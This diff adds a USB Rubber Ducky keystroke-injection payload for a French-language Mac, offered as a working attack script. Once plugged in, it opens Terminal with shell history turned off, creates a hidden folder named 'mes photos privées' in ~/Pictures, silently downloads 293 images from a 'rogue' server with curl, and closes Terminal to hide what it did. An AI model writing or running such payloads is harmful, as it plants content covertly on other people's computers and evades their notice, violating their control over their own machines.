@@ -1,0 +1,38 @@
+REM My 1st payload for USB Rubber Ducky
+REM Rogue download of pictures
+REM Target: Macintosh (w/French GUI)
+REM Author:	É. Dupont
+REM License:	GNU General Public License v3.0
+REM v0.6-beta  (April 2022)
+
+REM Delay 100ms between each command
+DEFAULT_DELAY 10
+
+REM Open a "Terminal" window
+GUI SPACE
+DELAY 50
+STRING Terminal.app
+ENTER
+DELAY 50
+
+REM Open a shell without history
+STRING /bin/zsh -i -o HIST_NO_STORE
+ENTER
+
+REM Create a hidden directory in "~/Pictures"
+STRING cd ~/Pictures
+ENTER
+STRING mkdir mes\ photos\ privées
+ENTER
+STRING chflags hidden mes\ photos\ privées
+ENTER
+
+REM Download "NFTW" pictures from the rogue ressource server
+STRING cd mes\ photos\ privées
+ENTER
+STRING curl --dns-ipv4-addr 9.9.9.9 --dns-ipv6-addr 2620:fe::fe --compressed --remote-name "https://example.com/path/IMG_[0001-0293].jpeg" >& /dev/null &!
+ENTER
+DELAY 100
+
+STRING killall Terminal
+ENTER
